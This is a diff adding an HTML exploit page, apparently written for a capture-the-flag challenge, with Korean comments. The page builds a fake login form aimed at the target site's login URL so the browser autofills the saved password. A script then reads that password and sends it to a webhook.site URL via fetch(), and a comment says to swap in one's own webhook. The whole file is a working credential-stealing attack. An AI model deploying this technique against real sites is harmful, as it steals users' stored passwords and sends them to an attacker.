@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Please wait, loading configuration...</h1>
+
+    <!-- 1. 브라우저의 자동 완성을 유발하는 가짜 로그인 폼 -->
+    <!-- form의 action 속성을 실제 타겟 사이트의 로그인 URL로 지정하는 것이 핵심입니다. -->
+    <!-- 이렇게 해야 브라우저가 이 폼을 해당 사이트의 로그인 폼으로 인식하고 정보를 채워 넣습니다. -->
+    <form id="fake-form" action="http://autofill-web.k17.kctf.cloud/login" method="POST">
+        <input type="text" name="username" value="admin">
+        <input type="password" name="password">
+    </form>
+
+    <script>
+        // 2. 비밀번호를 훔쳐서 Webhook으로 전송하는 스크립트
+
+        // 페이지 로드 후 브라우저가 폼을 채울 시간을 주기 위해 약간의 지연(500ms)을 줍니다.
+        setTimeout(() => {
+            // 자동 완성된 비밀번호 필드의 값을 가져옵니다.
+            const stolenPassword = document.querySelector('input[name="password"]').value;
+
+            // 비밀번호 값이 실제로 채워졌는지 확인합니다.
+            if (stolenPassword) {
+                // (중요) 아래 URL을 1단계에서 받은 자신의 Webhook URL로 바꾸세요.
+                const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
+                
+                // fetch API를 사용해 훔친 비밀번호를 Webhook으로 보냅니다.
+                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
+            }
+        }, 500);
+    </script>
+</body>
+</html>
